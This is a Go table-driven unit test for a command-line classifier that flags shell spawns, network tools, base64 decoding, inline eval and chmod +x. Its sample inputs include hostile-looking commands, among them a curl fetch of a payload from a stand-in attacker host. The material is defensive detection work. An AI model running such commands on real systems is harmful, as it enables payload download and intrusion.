package features

import "testing"

// TestClassifyArgv is table-driven, each class with a positive case and a
// near-miss negative chosen to catch a matcher that used a raw substring
// search instead of matching on the actual command token (e.g. "curl"
// wrongly matching inside "curly").
func TestClassifyArgv(t *testing.T) {
	tests := []struct {
		name string
		comm string
		argv string
		want ArgvClass
	}{
		{"bash as comm", "bash", "", ArgvClassShellSpawn},
		{"restricted bash is not bash", "rbash", "", ArgvClassNone},
		{"bash spawned via absolute path in argv", "node", "/bin/bash -c whoami", ArgvClassShellSpawn},
		{"word merely containing bash is not a shell spawn", "node", "bash-completion --version", ArgvClassNone},

		{"curl as comm", "curl", "curl http://evil.example/payload", ArgvClassNetworkTool},
		{"word merely containing curl is not a network tool", "node", "curly-thing --test", ArgvClassNone},

		{"base64 decode", "base64", "base64 -d payload.txt", ArgvClassBase64Decode},
		{"base64 encode (no -d) is not a decode", "base64", "base64 payload.txt", ArgvClassNone},

		{"node -e inline eval", "node", "node -e console.log(1)", ArgvClassEvalExec},
		{"node running a script file is not an inline eval", "node", "node server.js", ArgvClassNone},
		{"eval( literal in argv", "node", `node -p "eval('1+1')"`, ArgvClassEvalExec},
		{"evaluate( is not eval(", "node", "run evaluate(x)", ArgvClassNone},

		{"chmod +x", "chmod", "chmod +x payload.sh", ArgvClassChmodExec},
		{"chmod to a non-executable mode is not chmod-exec", "chmod", "chmod 644 file.txt", ArgvClassNone},

		{"ordinary comm and argv", "node", "node index.js", ArgvClassNone},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ClassifyArgv(tt.comm, tt.argv); got != tt.want {
				t.Errorf("ClassifyArgv(%q, %q) = %v, want %v", tt.comm, tt.argv, got, tt.want)
			}
		})
	}
}
